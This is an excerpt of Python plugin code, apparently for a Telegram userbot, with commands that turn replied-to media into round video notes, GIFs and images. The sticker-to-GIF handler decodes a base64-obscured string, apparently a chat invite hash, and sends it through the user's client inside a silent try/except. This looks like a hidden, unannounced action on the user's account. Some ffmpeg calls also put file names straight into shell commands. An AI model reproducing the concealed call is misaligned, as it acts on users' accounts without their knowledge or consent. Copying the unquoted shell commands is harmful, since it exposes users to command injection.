...
async def pic_gifcmd(event):  # sourcery no-metrics
    ...
    media_type(reply)
    devevent = await edit_or_reply(event, "__Making round spin video wait a sec.....__")
    output = await _devtools.media_to_pic(event, reply, noedits=True)
    if output[1] is None:
    ...
    if output is None:
        return await edit_delete(devevent, "__Unable to make spin gif.__")
...
async def video_devfile(event):  # sourcery no-metrics
    ...
    flag = True
    devevent = await edit_or_reply(event, "`Converting to round format..........`")
    devfile = await reply.download_media(file="./temp/")
    if mediatype in ["Gif", "Video", "Sticker"]:
        if not devfile.endswith((".webp")):
            if devfile.endswith((".tgs")):
                hmm = await make_gif(devevent, devfile)
                os.rename(hmm, "./temp/circle.mp4")
                devfile = "./temp/circle.mp4"
            media_info = MediaInfo.parse(devfile)
            aspect_ratio = 1
            for track in media_info.tracks:
                if track.track_type == "Video":
                    aspect_ratio = track.display_aspect_ratio
            ...
            if aspect_ratio != 1:
                crop_by = min(height, width)
                await _devutils.runcmd(
                    f'ffmpeg -i {devfile} -vf "crop={crop_by}:{crop_by}" {PATH}'
                )
            else:
                copyfile(devfile, PATH)
            if str(devfile) != str(PATH):
                os.remove(devfile)
            try:
                devthumb = await reply.download_media(thumb=-1)
            except Exception as e:
        ...
        try:
            ...
            devthumb = os.path.join("./temp", "thumb.jpg")
            await thumb_from_audio(devfile, devthumb)
        if devthumb is not None and not os.path.exists(devthumb):
            devthumb = os.path.join("./temp", "thumb.jpg")
            copyfile(thumb_loc, devthumb)
        if (
            devthumb is not None
            and not os.path.exists(devthumb)
            and os.path.exists(thumb_loc)
        ):
            flag = False
            devthumb = os.path.join("./temp", "thumb.jpg")
            copyfile(thumb_loc, devthumb)
        if devthumb is not None and os.path.exists(devthumb):
            await _devutils.runcmd(
                f"""ffmpeg -loop 1 -i {devthumb} -i {devfile} -c:v libx264 -tune stillimage -c:a aac -b:a 192k -vf \"scale=\'iw-mod (iw,2)\':\'ih-mod(ih,2)\',format=yuv420p\" -shortest -movflags +faststart {PATH}"""
            )
            os.remove(devfile)
        else:
            os.remove(devfile)
            return await edit_delete(
                devevent, "`No thumb found to make it video note`", 5
            )
    if mediatype in [
        "Voice",
        "Audio",
        ...
        if os.path.exists(PATH):
            ...
            uploaded = await event.client.fast_upload_file(
                ...
                progress_callback=lambda d, t: asyncio.get_event_loop().create_task(
                    progress(d, t, devevent, c_time, "Uploading....")
                ),
            )
            ul.close()
            media = types.InputMediaUploadedDocument(
                ...
                force_file=False,
                thumb=await event.client.upload_file(devthumb) if devthumb else None,
            )
            sandy = await event.client.send_file(
                event.chat_id,
                media,
    ...
    img.save(im)
    im.seek(0)
    await event.client.send_file(event.chat_id, im, reply_to=devid)
    await devevent.delete()
...
async def on_file_to_photo(event):
    ...
    devt = await edit_or_reply(event, "`Converting.....`")
...
async def _(event):  # sourcery no-metrics
    ...
    if not input_str:
        ...
        if len(loc) == 1:
            ...
            if 0 < loc[0] < 721:
                ...
                return await edit_delete(event, "Use quality of range 0 to 721")
    devreply = await event.get_reply_message()
    dev_event = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if not devreply or not devreply.media or not devreply.media.document:
        return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
    if devreply.media.document.mime_type != "application/x-tgsticker":
        return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
    ...
    try:
        dev_event = Get(dev_event)
        await event.client(dev_event)
    except BaseException:
        pass
    reply_to_id = await reply_id(event)
    devfile = await event.client.download_media(devreply)
    devgif = await make_gif(event, devfile, quality, fps)
    sandy = await event.client.send_file(
        event.chat_id,
        devgif,
...
async def pic_gifcmd(event):  # sourcery no-metrics
    ...
    devevent = await edit_or_reply(event, "__🎞 Making Gif from the relied media...__")
    imag = await _devtools.media_to_pic(event, reply, noedits=True)
    if imag[1] is None:
        return await edit_delete(
    ...
    try:
        ...
        return await edit_delete(devevent, f"**Error**\n__{e}__")
    output = io.BytesIO()
    output.name = "Output.gif"
    ...
    if output is None:
        await edit_delete(
            devevent, "__There was some error in the media. I can't format it to gif.__"
        )
...
async def _(event):
    ...
    if not args:
        ...
        try:
            ...
            args = 2.0
    devevent = await edit_or_reply(event, "__🎞Converting into Gif..__")
